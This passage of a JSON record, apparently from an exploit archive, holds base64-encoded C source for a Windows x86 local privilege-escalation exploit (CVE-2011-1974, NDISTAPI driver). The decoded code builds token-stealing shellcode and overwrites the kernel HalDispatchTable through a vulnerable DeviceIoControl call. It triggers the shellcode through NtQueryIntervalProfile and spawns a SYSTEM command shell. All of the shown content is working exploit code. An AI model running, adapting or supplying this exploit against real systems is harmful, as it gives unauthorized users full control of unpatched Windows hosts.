ICAgIGJyZWFrOw0KICAgICAgICB9ICAgICANCiAgICB9DQoNCiAgICAvLyBiYXNlIGFkZHJlc3Mgb2YgdGhlIGxvYWRlZCBtb2R1bGUgKGtlcm5lbCBzcGFjZSkNCiAgICBwcmludGYoIiAgICAgIFsqXSBBZGRyZXNzOiAgICAgICUjMDEweFxuIiwgdGFyZ2V0S3JubE1kbEJhc2VBZGRyKTsNCg0KICAgIC8vIG9mZnNldCBhZGRyZXNzIChyZWxhdGl2ZSB0byB0aGUgcGFyZW50IHByb2Nlc3MpIG9mIHRoZSBsb2FkZWQgbW9kdWxlICh1c2VyIHNwYWNlKQ0KICAgIHByaW50ZigiICAgICAgWypdIE9mZnNldDogICAgICAgJSMwMTB4XG4iLCB0YXJnZXRLcm5sTWRsVXNyU3BjT2Zmcyk7DQoNCiAgICBpZighZm91bmRNb2R1bGUpDQogICAgew0KICAgICAgICBwcmludGYoIiAgIFstXSBDb3VsZCBub3QgZmluZCBudGtybmxwYS5leGUvbnRvc2tybmwuZXhlXG4iKTsNCiAgICAgICAgcmV0dXJuIC0xOw0KICAgIH0NCg0KICAgIC8vIGZyZWUgYWxsb2NhdGVkIGJ1ZmZlciBzcGFjZQ0KICAgIGZyZWUoc3lzdGVtSW5mb3JtYXRpb25CdWZmZXIpOw0KDQoNCiAgICAvLyBkZXRlcm1pbmUgdGhlIGFkZHJlc3Mgb2YgdGhlICJIYWxEaXNwYXRjaFRhYmxlIiBwcm9jZXNzIChrZXJuZWwgc3BhY2UpDQogICAgLy8gbG9jYXRlIHRoZSBvZmZzZXQgZm8gdGhlICJIYWxEaXNwYXRjaFRhYmxlIiBwcm9jZXNzIHdpdGhpbiB0aGUgdGFyZ2V0IG1vZHVsZSAodXNlciBzcGFjZSkNCiAgICBVTE9OR19QVFIgSGFsRGlzcGF0Y2hUYWJsZVVzclNwY09mZnM7DQogICAgSGFsRGlzcGF0Y2hUYWJsZVVzclNwY09mZnMgPSAoVUxPTkdfUFRSKSBHZXRQcm9jQWRkcmVzcyh0YXJnZXRLcm5sTWRsVXNyU3BjT2ZmcywgIkhhbERpc3BhdGNoVGFibGUiKTsNCg0KICAgIGlmKCFIYWxEaXNwYXRjaFRhYmxlVXNyU3BjT2ZmcykNCiAgICB7DQogICAgICAgIHByaW50ZigiICAgICAgWy1dIENvdWxkIG5vdCBmaW5kIEhhbERpc3BhdGNoVGFibGVcbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgcHJpbnRmKCIgICAgICBbK10gSGFsRGlzcGF0Y2hUYWJsZVxuIik7DQogICAgcHJpbnRmKCIgICAgICAgICBbKl0gT2Zmc2V0OiAgICAlIzAxMHhcbiIsIEhhbERpc3BhdGNoVGFibGVVc3JTcGNPZmZzKTsNCg0KICAgIC8vIGNhbGN1bGF0ZSB0aGUgYWRkcmVzcyBvZiAiSGFsRGlzcGF0Y2hUYWJsZSIgaW4ga2VybmVsIHNwYWNlDQogICAgLy8gMS4gaWRlbnRpZnkgdGhlIGJhc2UgYWRkcmVzcyBvZiB0aGUgdGFyZ2V0IG1vZHVsZSBpbiBrZXJuZWwgc3BhY2UNCiAgICAvLyAyLiBwcmV2aW91cyBzdGVwJ3MgcmVzdWx0IFttaW51c10gdGhlIGxvYWQgYWRkcmVzcyBvZiB0aGUgc2FtZSBtb2R1bGUgaW4gdXNlciBzcGFjZQ0KICAgIC8vIDMuIHByZXZpb3VzIHN0ZXAncyByZXN1bHQgW3BsdXNdIHRoZSBhZGRyZXNzIG9mICJIYWxEaXNwYXRjaFRhYmxlIiBpbiB1c2VyIHNwYWNlDQogICAgLy8gRVFVSVZBTEVOVCBUTzoNCiAgICAvLyAxLiBkZXRlcm1pbmUgUlZBIG9mIEhhbERpc3BhdGNoVGFibGUNCiAgICAvLyAqUmVsYXRpdmUgVmlydHVhbCBBZGRyZXNzIC0gdGhlIGFkZHJlc3Mgb2YgYW4gaXRlbSBhZnRlciBpdCBpcyBsb2FkZWQgaW50byBtZW1vcnksIHdpdGggdGhlIGJhc2UgYWRkcmVzcyBvZiB0aGUgaW1hZ2UgZmlsZSBzdWJ0cmFjdGVkIGZyb20gaXQuDQogICAgLy8gMi4gcHJldmlvdXMgc3RlcCdzIHJlc3VsdCBbcGx1c10gYmFzZSBhZGRyZXNzIG9mIHRhcmdldCBtb2R1bGUgaW4ga2VybmVsIHNwYWNlDQogICAgVUxPTkdfUFRSIEhhbERpc3BhdGNoVGFibGVLcm5sU3BjQWRkcjsNCiAgICBIYWxEaXNwYXRjaFRhYmxlS3JubFNwY0FkZHIgPSBIYWxEaXNwYXRjaFRhYmxlVXNyU3BjT2ZmcyAtIChVTE9OR19QVFIpIHRhcmdldEtybmxNZGxVc3JTcGNPZmZzOw0KICAgIEhhbERpc3BhdGNoVGFibGVLcm5sU3BjQWRkciArPSAoVUxPTkdfUFRSKSB0YXJnZXRLcm5sTWRsQmFzZUFkZHI7DQoNCg0KICAgIC8vIGxvY2F0ZSAiTnRRdWVyeUludGVydmFsUHJvZmlsZSIgaW4gdGhlICJudGRsbC5kbGwiIG1vZHVsZQ0KICAgIFBOVFFVRVJZSU5URVJWQUwgTnRRdWVyeUludGVydmFsUHJvZmlsZTsNCiAgICBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlID0gKFBOVFFVRVJZSU5URVJWQUwpIEdldFByb2NBZGRyZXNzKEdldE1vZHVsZUhhbmRsZSgibnRkbGwuZGxsIiksICJOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlIik7DQoNCiAgICBpZighTnRRdWVyeUludGVydmFsUHJvZmlsZSkNCiAgICB7DQogICAgICAgIHByaW50ZigiICAgWy1dIENvdWxkIG5vdCBmaW5kIE50UXVlcnlJbnRlcnZhbFByb2ZpbGVcbiIpOw0KICAgICAgICByZXR1cm4gLTE7DQogICAgfQ0KDQogICAgcHJpbnRmKCIgICBbK10gTnRRdWVyeUludGVydmFsUHJvZmlsZVxuIik7DQogICAgcHJpbnRmKCIgICAgICBbKl0gQWRkcmVzczogICAgICAlIzAxMHhcbiIsIE50UXVlcnlJbnRlcnZhbFByb2ZpbGUpOw0KDQoNCiAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogICAgLy8gQ1JFQVRFIFRPS0VOIFNURUFMSU5HIFNIRUxMQ09ERQ0KICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KICAgIHByaW50ZigiWypdIENyZWF0aW5nIHRva2VuIHN0ZWFsaW5nIHNoZWxsY29kZVxuIik7DQoNCg0KICAgIC8vIGNvbnN0cnVjdCB0aGUgdG9rZW4gc3RlYWxpbmcgc2hlbGxjb2RlDQogICAgdW5zaWduZWQgY2hhciBzaGVsbGNvZGVbXSA9DQogICAgew0KICAgICAgICAweDUyLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gUFVTSCBFRFggICAgICAgICAgICAgICAgICAgICBTYXZlIEVEWCBvbiB0aGUgc3RhY2sgKHNhdmUgY29udGV4dCkNCiAgICAgICAgMHg1MywJICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBQVVNIIEVCWCAgICAgICAgICAgICAgICAgICAgIFNhdmUgRUJYIG9uIHRoZSBzdGFjayAoc2F2ZSBjb250ZXh0KQ0KICAgICAgICAweDMzLDB4QzAsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gWE9SIEVBWCwgRUFYICAgICAgICAgICAgICAgICBaZXJvIG91dCBFQVggKEVBWCA9IDApDQogICAgICAgIDB4NjQsMHg4QiwweDgwLDB4MjQsMHgwMSwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBNT1YgRUFYLCBGUzpbRUFYKzB4MTI0XSAgICAgIFJldHJpZXZlIGN1cnJlbnQgX0tUSFJFQUQgc3RydWN0dXJlDQogICAgICAgIDB4OEIsMHg0MCxzaGVsbGNvZGVfS1BST0NFU1MsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBNT1YgRUFYLCBbRUFYK19LUFJPQ0VTU10gICAgIFJldHJpZXZlIF9FUFJPQ0VTUyBzdHJ1Y3R1cmUNCiAgICAgICAgMHg4QiwweEM4LCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIE1PViBFQ1gsIEVBWCAgICAgICAgICAgICAgICAgQ29weSBFQVggKF9FUFJPQ0VTUykgdG8gRUNYDQogICAgICAgIDB4OEIsMHg5OCxzaGVsbGNvZGVfVE9LRU4sMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAvLyBNT1YgRUJYLCBbRUFYK19UT0tFTl0gICAgICAgIFJldHJpZXZlIGN1cnJlbnQgX1RPS0VODQogICAgICAgIDB4OEIsMHg4MCxzaGVsbGNvZGVfQVBMSU5LUywweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAvLyBNT1YgRUFYLCBbRUFYK19BUExJTktTXSA8LXwgIFJldHJpZXZlIEZMSU5LIGZyb20gQWN0aXZlUHJvY2Vzc0xpbmtzDQogICAgICAgIDB4ODEsMHhFOCxzaGVsbGNvZGVfQVBMSU5LUywweDAwLDB4MDAsMHgwMCwgICAgICAgICAgICAgICAgICAvLyBTVUIgRUFYLCBfQVBMSU5LUyAgICAgICAgIHwgIFJldHJpZXZlIEVQUk9DRVNTIGZyb20gQWN0aXZlUHJvY2Vzc0xpbmtzDQogICAgICAgIDB4ODEsMHhCOCxzaGVsbGNvZGVfVVBJRCwweDAwLDB4MDAsMHgwMCwweDA0LDB4MDAsMHgwMCwweDAwLCAvLyBDTVAgW0VBWCtfVVBJRF0sIDB4NCAgICAgIHwgIENvbXBhcmUgVW5pcXVlUHJvY2Vzc0lkIHdpdGggNCAoU3lzdGVtIFByb2Nlc3MpDQogICAgICAgIDB4NzUsMHhFOCwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBKTlovSk5FICAgICAgICAgICAgICAgIC0tLS0gIEp1bXAgaWYgbm90IHplcm8vbm90IGVxdWFsDQogICAgICAgIDB4OEIsMHg5MCxzaGVsbGNvZGVfVE9LRU4sMHgwMCwweDAwLDB4MDAsICAgICAgICAgICAgICAgICAgICAvLyBNT1YgRURYLCBbRUFYK19UT0tFTl0gICAgICAgIENvcHkgU1lTVEVNIF9UT0tFTiB0byBFRFgNCiAgICAgICAgMHg4QiwweEMxLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIE1PViBFQVgsIEVDWCAgICAgICAgICAgICAgICAgQ29weSBFQ1ggKGN1cnJlbnQgcHJvY2VzcyBfVE9LRU4pIHRvIEVBWA0KICAgICAgICAweDg5LDB4OTAsc2hlbGxjb2RlX1RPS0VOLDB4MDAsMHgwMCwweDAwLCAgICAgICAgICAgICAgICAgICAgLy8gTU9WIFtFQVgrX1RPS0VOXSwgRURYICAgICAgICBDb3B5IFNZU1RFTSBfVE9LRU4gdG8gY3VycmVudCBwcm9jZXNzIF9UT0tFTg0KICAgICAgICAweDVCLCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgLy8gUE9QIEVCWCAgICAgICAgICAgICAgICAgICAgICBQb3AgY3VycmVudCBzdGFjayB2YWx1ZSB0byBFQlggKHJlc3RvcmUgY29udGV4dCkNCiAgICAgICAgMHg1QSwgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIC8vIFBPUCBFRFggICAgICAgICAgICAgICAgICAgICAgUG9wIGN1cnJlbnQgc3RhY2sgdmFsdWUgdG8gRURYIChyZXN0b3JlIGNvbnRleHQpDQogICAgICAgIDB4QzIsMHgwOCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBSRVQgOCAgICAgICAgICAgICAgICAgICAgICAgIFJldHVybg0KICAgIH07DQoNCiAgICBwcmludGYoIiAgIFsqXSBTaGVsbGNvZGUgYXNzZW1ibGVkXG4iKTsNCg0KDQogICAgLy8gYWxsb2NhdGUgbWVtb3J5IChSV0UgcGVybWlzc2lvbnMpIGZvciB0aGUgc2hlbGxjb2RlDQogICAgcHJpbnRmKCIgICBbKl0gQWxsb2NhdGluZyBtZW1vcnlcbiIpOw0KICAgIExQVk9JRCBzaGVsbGNvZGVBZGRyZXNzOw0KICAgIHNoZWxsY29kZUFkZHJlc3MgPSBWaXJ0dWFsQWxsb2MoTlVMTCwgc2l6ZW9mKHNoZWxsY29kZSksIE1FTV9SRVNFUlZFIHwgTUVNX0NPTU1JVCwgUEFHRV9FWEVDVVRFX1JFQURXUklURSk7DQoNCiAgICBpZihzaGVsbGNvZGVBZGRyZXNzID09IE5VTEwpDQogICAgew0KICAgICAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczY4MTM4MSh2PXZzLjg1KS5hc3B4DQogICAgICAgIHByaW50ZigiICAgICAgWy1dIEZhaWxlZCAoZXJyb3IgY29kZTogJWQpXG4iLCBHZXRMYXN0RXJyb3IoKSk7DQogICAgICAgIHJldHVybiAtMTsNCiAgICB9DQoNCiAgICBwcmludGYoIiAgICAgIFsrXSBBZGRyZXNzOiAgICAgICUjMDEweFxuIiwgc2hlbGxjb2RlQWRkcmVzcyk7DQoNCg0KICAgIC8vIGNvcHkgdGhlIHNoZWxsY29kZSB0byB0aGUgYWxsb2NhdGVkIG1lbW9yeQ0KICAgIG1lbWNweSgoc2hlbGxjb2RlQWRkcmVzcyksIHNoZWxsY29kZSwgc2l6ZW9mKHNoZWxsY29kZSkpOw0KICAgIHByaW50ZigiICAgICAgWypdIFNoZWxsY29kZSBjb3BpZWRcbiIpOw0KDQoNCiAgICAvLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vDQogICAgLy8gRVhQTE9JVCBUSEUgVlVMTkVSQUJJTElUWQ0KICAgIC8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8vLy8NCg0KICAgIHByaW50ZigiWypdIEV4cGxvaXRpbmcgdnVsbmVyYWJpbGl0eVxuIik7DQoNCg0KICAgIC8vIG9wZW4gdGhlIHZ1bG5lcmFibGUgZGV2aWNlIGRyaXZlcg0KICAgIEhBTkRMRSB0YXJnZXREZXZpY2VIYW5kbGU7DQogICAgVUxPTkcgZHdSZXR1cm5TaXplOw0KICAgIGludCBlcnJvckNvZGUgPSAwOw0KDQogICAgcHJpbnRmKCIgICBbKl0gT3BlbmluZyBORElTVEFQSSBkZXZpY2UgZHJpdmVyXG4iKTsNCiAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9hYTM2Mzg1OCh2PXZzLjg1KS5hc3B4DQogICAgdGFyZ2V0RGV2aWNlSGFuZGxlID0gQ3JlYXRlRmlsZSgiXFxcXC5cXE5ESVNUQVBJIiwgR0VORVJJQ19SRUFEIHwgR0VORVJJQ19XUklURSwgMCwgTlVMTCwgQ1JFQVRFX0FMV0FZUywgMCwgMCk7DQoNCiAgICAvLyBpbiBjYXNlIHRoZSBmdW5jdGlvbiBmYWlscw0KICAgIGlmKHRhcmdldERldmljZUhhbmRsZSA9PSBJTlZBTElEX0hBTkRMRV9WQUxVRSkNCiAgICB7DQogICAgICAgIC8vIHRoZSBkZXZpY2UgZHJpdmVyIHdhcyBub3Qgb3BlbmVkIHN1Y2Nlc3NmdWxseQ0KICAgICAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczY3OTM2MCh2PXZzLjg1KS5hc3B4DQogICAgICAgIGVycm9yQ29kZSA9IEdldExhc3RFcnJvcigpOw0KICAgICAgICAvLyBodHRwczovL21zZG4ubWljcm9zb2Z0LmNvbS9lbi11cy9saWJyYXJ5L3dpbmRvd3MvZGVza3RvcC9tczY4MTM4MSh2PXZzLjg1KS5hc3B4DQogICAgICAgIC8vIGluIGNhc2Ugb2YgRVJST1JfRklMRV9OT1RfRk9VTkQNCiAgICAgICAgaWYoZXJyb3JDb2RlID09IDIpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vIHRoZSB2dWxuZXJhYmxlIHNlcnZpY2UgaXMgbm90IHJ1bm5pbmcNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgWyFdIFJlbW90ZSBBY2Nlc3MgU2VydmljZSBub3Qgc3RhcnRlZFxuIik7DQogICAgICAgICAgICBwcmludGYoIiAgICAgICAgIFsqXSBydW4gXCJzYyBzdGFydCByZW1vdGVhY2Nlc3NcIlxuIik7DQogICAgICAgICAgICByZXR1cm4gLTE7DQogICAgICAgIH0NCiAgICAgICAgLy8gaW4gY2FzZSBvZiBhbnkgb3RoZXIgZXJyb3IgbWVzc2FnZQ0KICAgICAgICBlbHNlDQogICAgICAgIHsNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgWy1dIEZhaWxlZCAoZXJyb3IgY29kZTogJWQpXG4iLCBlcnJvckNvZGUpOw0KICAgICAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgICB9DQogICAgfQ0KICAgIC8vIGluIGNhc2UgdGhlIGZ1bmN0aW9uIHN1Y2NlZWRzDQogICAgZWxzZQ0KICAgIHsNCiAgICAgICAgLy8gdGhlIGRldmljZSBkcml2ZXIgd2FzIG9wZW5lZCBzdWNjZXNmdWxseQ0KICAgICAgICBwcmludGYoIiAgICAgIFsrXSBEb25lXG4iKTsNCiAgICB9DQoNCg0KICAgIC8vIGNvcHkgdGhlIHNoZWxsY29kZSBhZGRyZXNzIHRvIHRoZSBpbnB1dCBidWZmZXINCiAgICB1bnNpZ25lZCBjaGFyIElucHV0QnVmZmVyWzhdPXswfTsNCiAgICBtZW1jcHkoKElucHV0QnVmZmVyICsgNCksICZzaGVsbGNvZGVBZGRyZXNzLCBzaXplb2Yoc2hlbGxjb2RlQWRkcmVzcykpOw0KDQoNCiAgICAvLyB0cmlnZ2VyIHZ1bG5lcmFiaWxpdHkgKGNhdXNlIGFyYml0cmFyeSBtZW1vcnkgb3ZlcndyaXRlKQ0KICAgIHByaW50ZigiICAgWypdIENhbGxpbmcgdnVsbmVyYWJsZSBmdW5jdGlvblxuIik7DQogICAgaWYoRGV2aWNlSW9Db250cm9sKA0KICAgICAgICB0YXJnZXREZXZpY2VIYW5kbGUsDQogICAgICAgIDB4OGZmZjIzZDQsICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAvLyBEb0xpbmVDcmVhdGVXb3JrDQogICAgICAgIChQVk9JRCkgSW5wdXRCdWZmZXIsIHNpemVvZihJbnB1dEJ1ZmZlciksDQogICAgICAgIChQVk9JRCkgKEhhbERpc3BhdGNoVGFibGVLcm5sU3BjQWRkciksIDAsDQogICAgICAgICZkd1JldHVyblNpemUsIE5VTEwNCiAgICAgICAgKSA9PSAwKQ0KICAgIHsNCiAgICAgICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM2NzkzNjAodj12cy44NSkuYXNweA0KICAgICAgICBlcnJvckNvZGUgPSBHZXRMYXN0RXJyb3IoKTsNCiAgICAgICAgLy8gaHR0cHM6Ly9tc2RuLm1pY3Jvc29mdC5jb20vZW4tdXMvbGlicmFyeS93aW5kb3dzL2Rlc2t0b3AvbXM2ODEzODEodj12cy44NSkuYXNweA0KICAgICAgICAvLyBpbiBjYXNlIG9mIEVSUk9SX0lOU1VGRklDSUVOVF9CVUZGRVINCiAgICAgICAgaWYoZXJyb3JDb2RlID09IDEyMikNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gdGFyZ2V0IGlzIHBhdGNoZWQNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgWyFdIFRhcmdldCBwYXRjaGVkXG4iKTsNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgICAgWypdIFBvc3NpYmxlIHNlY3VyaXR5IHBhdGNoZXNcbiIpOw0KICAgICAgICAgICAgZm9yKGkgPSAwOyBpIDwgc2VjdXJpdHlQYXRjaGVzQ291bnQ7IGkrKykNCiAgICAgICAgICAgICAgICBwcmludGYoIiAgICAgICAgICAgIFsqXSAlc1xuIiwgc2VjdXJpdHlQYXRjaGVzUHRyW2ldKTsNCiAgICAgICAgICAgIHJldHVybiAtMTsNCiAgICAgICAgfQ0KICAgICAgICAvLyBpbiBjYXNlIG9mIGFueSBvdGhlciBlcnJvciBtZXNzYWdlDQogICAgICAgIGVsc2UNCiAgICAgICAgew0KICAgICAgICAgICAgLy8gcHJpbnQgdGhlIGVycm9yIGNvZGUNCiAgICAgICAgICAgIHByaW50ZigiICAgICAgWy1dIEZhaWxlZCAoZXJyb3IgY29kZTogJWQpXG4iLCBlcnJvckNvZGUpOw0KICAgICAgICAgICAgcmV0dXJuIC0xOw0KICAgICAgICB9DQogICAgfQ0KICAgIGVsc2UNCiAgICAgICAgcHJpbnRmKCIgICAgICBbK10gRG9uZVxuIik7DQoNCg0KICAgIC8vIGVsZXZhdGUgcHJpdmlsZWdlcyBvZiB0aGUgY3VycmVudCBwcm9jZXNzDQogICAgcHJpbnRmKCIgICAgICBbKl0gRWxldmF0aW5nIHByaXZpbGVnZXMgdG8gU1lTVEVNXG4iKTsNCiAgICBVTE9ORyBvdXRJbnRlcnZhbCA9IDA7DQogICAgLy8gaHR0cHM6Ly91bmRvY3VtZW50ZWQubnRpbnRlcm5hbHMubmV0L2luZGV4Lmh0bWw/cGFnZT1Vc2VyTW9kZSUyRlVuZG9jdW1lbnRlZCUyMEZ1bmN0aW9ucyUyRk5UJTIwT2JqZWN0cyUyRlByb2ZpbGUlMkZOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlLmh0bWwNCiAgICBOdFF1ZXJ5SW50ZXJ2YWxQcm9maWxlKDIsICZvdXRJbnRlcnZhbCk7DQogICAgcHJpbnRmKCIgICAgICAgICBbK10gRG9uZVxuIik7DQoNCg0KICAgIC8vIHNwYXduIHNoZWxsICh3aXRoIGVsZXZhdGVkIHByaXZpbGVnZXMpDQogICAgcHJpbnRmKCIgICAgICAgICBbKl0gU3Bhd25pbmcgc2hlbGxcbiIpOw0KICAgIC8vIHNwYXduIFNZU1RFTSBzaGVsbCB3aXRoaW4gdGhlIGN1cnJlbnQgc2hlbGwgKHJlbW90ZSBzaGVsbCBmcmllbmRseSkNCiAgICBzeXN0ZW0gKCJjOlxcd2luZG93c1xcc3lzdGVtMzJcXGNtZC5leGUgL0sgY2QgYzpcXHdpbmRvd3NcXHN5c3RlbTMyIik7DQoNCiAgICAvLyBleGl0DQogICAgcHJpbnRmKCJcblsqXSBFeGl0aW5nIFNZU1RFTSBzaGVsbFxuIik7DQogICAgcmV0dXJuIDE7DQp9DQoNCi8vIEVvRg==", 
    "filename": "platforms/win_x86/local/40627.c", 
    "id": "40627", 
    "cves": [
        "CVE-2011-1974"
    ]
}